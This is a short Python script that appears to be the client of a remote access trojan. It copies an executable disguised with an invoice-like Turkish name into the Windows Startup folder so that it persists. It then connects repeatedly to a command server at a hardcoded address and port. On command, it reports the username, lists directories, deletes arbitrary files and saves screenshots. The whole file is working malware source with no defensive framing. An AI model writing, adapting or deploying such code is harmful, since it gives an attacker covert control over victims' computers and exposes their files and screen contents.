import socket
import os
import shutil
import pyautogui

user = os.getlogin()
directory = os.getcwd()
path = "C:\\Users\\" + str(user) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\iscilikfaturası.exe"
des = str(directory) +"\iscilikfaturası.exe"
print(des)

if os.path.exists(path):
    print("file is exists")
else:
    shutil.copy(des, path)

while True:
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect(("127.0.0.1", 62121))
            break
        except:
            print("Trying to connect...")
    while True:
        try:
            data = (s.recv(1024)).decode("utf-8")
        except:
            break
        if data == "user":
            s.sendall(user.encode("utf-8"))
        elif data == "tree":
            tree_input_data = (s.recv(1024)).decode("utf-8")
            tree_data = str(os.listdir(tree_input_data))
            s.sendall(tree_data.encode("utf-8"))
        elif data == "del":
            del_input_data = (s.recv(1024)).decode("utf-8")
            os.remove(del_input_data)
        elif data == "screenshot":
            ss_input_data = (s.recv(1024)).decode("utf-8")
            screenshot = pyautogui.screenshot()
            screenshot.save(ss_input_data)
